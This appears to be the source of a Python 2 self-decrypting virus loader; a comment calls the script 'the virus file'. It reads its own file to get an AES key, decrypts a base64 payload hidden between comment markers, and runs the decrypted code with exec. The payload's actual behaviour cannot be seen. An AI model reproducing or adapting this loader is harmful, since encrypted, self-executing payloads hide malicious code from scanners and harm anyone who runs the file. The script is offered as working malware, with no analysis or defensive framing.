######################################################## First script python
# coding=utf-8
# Start Uncrypted
import os                        
import __main__                                     
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES
from Crypto import Random

# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   key = this.readline()
   this.close()

   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '#Start payload':
      copy = True
   elif line.strip() == '#End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
print e
exec e
sys.exit('Good job!')
# End Uncrypted

#Start payload
#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
#End payload